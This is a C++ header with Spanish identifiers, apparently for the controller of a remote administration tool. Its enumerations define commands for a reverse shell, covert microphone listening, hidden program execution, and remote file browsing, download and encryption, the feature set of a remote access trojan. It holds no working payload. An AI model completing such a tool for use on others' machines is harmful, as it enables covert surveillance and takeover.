#ifndef _HEADERS
#define _HEADERS 1

#include<wx/wx.h> 
#include<wx/thread.h>
#include<wx/listctrl.h>
#include<wx/tglbtn.h >
#include<wx/toolbar.h>
#include<wx/treectrl.h>
#include<wx/sizer.h>
#include<wx/wxhtml.h>
#include<wx/aui/aui.h>

#include<ws2tcpip.h>
#include<windows.h>
#include<iostream>
#include<mutex>
#include<atomic>
#include<thread>
#include<map>
#include<random>
#include<fcntl.h>
#include<fstream>
#include<sstream>
#include<string>
#include<vector>
#include<cstring>
#include<ctime>
#include <mmsystem.h>

#include <iomanip>

#include "aes256/aes256.hpp"

#define PING_TIME 5 * 1
#define AES_KEY_LEN 32
#define FRAME_CLIENT_SIZE_WIDTH 600

//FM Modos
#define FM_EQUIPO    500
#define FM_NORMAL    501


extern bool bSignalFlag;
#define error() std::cout<<"Error["<<GetLastError()<<"]\n";

typedef unsigned int u_int;
typedef unsigned long long int u64;

namespace EnumIDS {
    enum Enum {
        ID_LimpiarLog = 100,
        ID_Interactuar,
        ID_FrameClienteTest,
        TreeCtrl_ID,
        ID_Panel_Reverse_Shell,
        ID_Panel_Reverse_Shell_TxtConsole,
        ID_Panel_Test,
        ID_Panel_Label_Test,
        ID_Panel_Microphone,
        ID_Panel_Mic_CMB_Devices,
        ID_Panel_Mic_BTN_Refresh,
        ID_Panel_Mic_BTN_Escuchar,
        ID_Panel_Mic_BTN_Detener,
        ID_Panel_FM,
        ID_Panel_FM_Equipo,
        ID_Panel_FM_Escritorio,
        ID_Panel_FM_Descargas,
        ID_Panel_FM_Refresh,
        ID_Panel_FM_Subir,
        ID_Panel_FM_List,
        ID_Panel_FM_LblRuta,
        ID_Toggle
    };
}

namespace EnumMenuFM {
    enum Enum {
        ID_Exec_Oculto = 9999,
        ID_Exec_Visible,
        ID_Editar,
        ID_Eliminar,
        ID_Descargar,
        ID_Crypt,
        ID_Decrypt,
        ID_New_Folder,
        ID_New_Archivo,
    };
}

namespace EnumComandos {
    enum Enum {
        PONG = 499,
        PING,
        Reverse_Shell_Start,
        Reverse_Shell_Command,
        Reverse_Shell_Salida,
        Reverse_Shell_Finish,
        Mic_Refre_Dispositivos,
        Mic_Refre_Resultado,
        Mic_Iniciar_Escucha,
        Mic_Detener_Escucha,
        Mic_Live_Packet,
        FM_Discos,
        FM_Discos_Lista,
        FM_Dir_Folder,
        FM_CPATH,
        FM_Crear_Folder,
        FM_Crear_Archivo,
        FM_Borrar_Archivo,
        FM_Descargar_Archivo,
        FM_Descargar_Archivo_Recibir, //Recibir paquete del cliente
        FM_Descargar_Archivo_Init, //Recibir el tamaño del archivo
        FM_Descargar_Archivo_End //Ya se recibio todo, cerrar archivo
    };
}

#endif